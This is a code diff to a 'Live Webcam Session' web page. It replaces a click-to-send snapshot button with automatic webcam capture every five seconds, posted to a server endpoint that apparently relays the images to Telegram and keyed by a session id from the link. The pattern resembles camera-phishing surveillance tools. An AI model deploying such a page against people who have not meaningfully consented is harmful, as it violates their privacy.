@@ -7,7 +7,7 @@
 <body>
   <h1>Live Webcam Session</h1>
   <video id="video" width="320" height="240" autoplay></video>
-  <button id="snap">Send Snapshot to Telegram</button>
+  <p>Sending snapshots to Telegram every 5 seconds...</p>
 
   <script>
     const params = new URLSearchParams(window.location.search);
@@ -15,11 +15,15 @@
 
     const video = document.getElementById('video');
 
+    // Access webcam
     navigator.mediaDevices.getUserMedia({ video: true })
       .then(stream => { video.srcObject = stream; })
       .catch(err => alert('Error accessing webcam: ' + err));
 
-    document.getElementById('snap').onclick = async () => {
+    // Function to capture and send snapshot
+    async function sendSnapshot() {
+      if (video.readyState < 2) return; // video not ready
+
       const canvas = document.createElement('canvas');
       canvas.width = video.videoWidth;
       canvas.height = video.videoHeight;
@@ -27,15 +31,20 @@
 
       const imgData = canvas.toDataURL('image/png');
 
-      const res = await fetch('/api/sendPhoto', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ sessionId, imgData })
-      });
+      try {
+        await fetch('/api/sendPhoto', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ sessionId, imgData })
+        });
+        console.log('Snapshot sent to Telegram');
+      } catch (err) {
+        console.error('Failed to send snapshot:', err);
+      }
+    }
 
-      const result = await res.json();
-      alert(result.message);
-    };
+    // Send snapshot every 5 seconds
+    setInterval(sendSnapshot, 5000);
   </script>
 </body>
 </html>
